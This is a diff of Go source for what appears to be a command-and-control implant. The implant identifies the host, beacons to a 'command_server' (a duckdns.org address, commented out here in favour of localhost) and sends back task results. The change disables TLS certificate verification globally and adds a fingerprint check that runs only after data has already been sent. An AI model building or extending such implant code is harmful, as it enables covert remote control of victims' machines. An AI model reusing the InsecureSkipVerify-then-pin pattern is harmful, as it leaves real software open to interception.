@@ -2,10 +2,12 @@ package main
 
 import (
 	"bytes"
+	"crypto/sha256"
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
 	"encoding/json"
+	"encoding/pem"
 	"errors"
 	"fmt"
 	"io"
@@ -29,16 +31,18 @@ import (
 
 // Setting the command server
 // var command_server string = "https://192.168.0.69:8081"
-var command_server string = "https://root-27.duckdns.org:8081"
+// var command_server string = "https://root-27.duckdns.org:8081"
 
-// var command_server string = "https://localhost:8081"
+var command_server string = "https://localhost:8081"
 
 // var command_server string = "http://192.168.0.29:8081"
 
 // Variables assigned later
 var NodeID string = "" // This will be a GUID at some point
 
-var certPool *x509.CertPool
+// var transport *http.Transport
+
+// var tlsConfig *tls.Config
 
 type CheckIn struct {
 	ID       string `json:"ID"`
@@ -95,26 +99,44 @@ func main() {
 	NodeID, _ = machineid.ID()
 	// NodeID = "test"
 
-	// Weird cirt stuff
+	// Cert stuff
 
-	// Load the custom certificate file
-	pem, err := ioutil.ReadFile("server.crt")
-	if err != nil {
-		log.Fatalf("Failed to read certificate file: %v", err)
-	}
+	// AddCertToTrustStore("server.crt")
 
-	// Create a certificate pool with the custom certificate
-	certPool = x509.NewCertPool()
-	if !certPool.AppendCertsFromPEM(pem) {
-		log.Fatalf("Failed to add certificate to pool")
-	}
+	// Load the server certificate
+	// certFile := "server.crt"
+	// certBytes, err := ioutil.ReadFile(certFile)
+	// if err != nil {
+	// 	fmt.Println(err)
+	// }
+	// certPool := x509.NewCertPool()
+	// if ok := certPool.AppendCertsFromPEM(certBytes); !ok {
+	// 	// handle error
+	// 	fmt.Println("can't do something with the cert")
+	// }
 
-	// Create an HTTP client with the custom certificate pool
-	// client := &http.Client{
-	// 	Transport: &http.Transport{
-	// 		TLSClientConfig: &tls.Config{
-	// 			RootCAs: certPool,
-	// 		},
+	// // Create the tls.Config object with the server certificate
+	// tlsConfig = &tls.Config{
+	// 	RootCAs: certPool,
+	// }
+
+	// // Create a transport that uses the client's truststore to verify the server's certificate
+	// transport = &http.Transport{
+	// 	TLSClientConfig: &tls.Config{
+	// 		RootCAs: func() *x509.CertPool {
+	// 			certPool := x509.NewCertPool()
+	// 			certFile, err := os.Open("server.crt")
+	// 			if err != nil {
+	// 				log.Fatal(err)
+	// 			}
+	// 			defer certFile.Close()
+	// 			certBytes, err := ioutil.ReadAll(certFile)
+	// 			if err != nil {
+	// 				log.Fatal(err)
+	// 			}
+	// 			certPool.AppendCertsFromPEM(certBytes)
+	// 			return certPool
+	// 		}(),
 	// 	},
 	// }
 
@@ -148,13 +170,7 @@ func send_response(response_to_task Task_Response) {
 	r.Header.Add("Content-Type", "application/json")
 
 	//Create a client to send the data and then send it
-	client := &http.Client{
-		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{
-				RootCAs: certPool,
-			},
-		},
-	}
+	client := &http.Client{}
 	res, err := client.Do(r)
 	if err != nil {
 		// panic(err)
@@ -168,7 +184,7 @@ func send_response(response_to_task Task_Response) {
 func checkIn() {
 
 	// This allows us to use a self signed certificate.
-	// http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 
 	// Getting the info
 	hostname, _ := os.Hostname()
@@ -198,9 +214,15 @@ func checkIn() {
 		fmt.Println("Error sending data back to command server")
 		return
 	}
-
-	//shrug
 	defer res.Body.Close()
+
+	// Checks to make sure the server is the one that's expected
+	// If it's not the one that is expected, ignore the response
+	result := verifyServerCert(res, "server.crt")
+	if result != true {
+		fmt.Println("SERVER CERTIFICATES DO NOT MATCH")
+		return
+	}
 
 	// Bit of UI for you
 	if res.StatusCode == 200 {
@@ -636,4 +658,33 @@ func structToJSON(v interface{}) (string, error) {
 
 	// Convert the JSON bytes to a striπng and return it
 	return string(jsonBytes), nil
+}
+
+func verifyServerCert(resp *http.Response, filePath string) bool {
+	// Load the certificate from the file
+	certFile, err := ioutil.ReadFile(filePath)
+	if err != nil {
+		return false
+	}
+
+	// Parse the certificate PEM block
+	certPEM, _ := pem.Decode(certFile)
+	if certPEM == nil {
+		return false
+	}
+
+	// Parse the certificate
+	cert, err := x509.ParseCertificate(certPEM.Bytes)
+	if err != nil {
+		return false
+	}
+
+	// Calculate the SHA256 fingerprint of the certificate
+	certFingerprint := sha256.Sum256(cert.Raw)
+
+	// Get the SHA256 fingerprint of the certificate from the response
+	respFingerprint := sha256.Sum256(resp.TLS.PeerCertificates[0].Raw)
+
+	// Compare the fingerprints
+	return certFingerprint == respFingerprint
 }
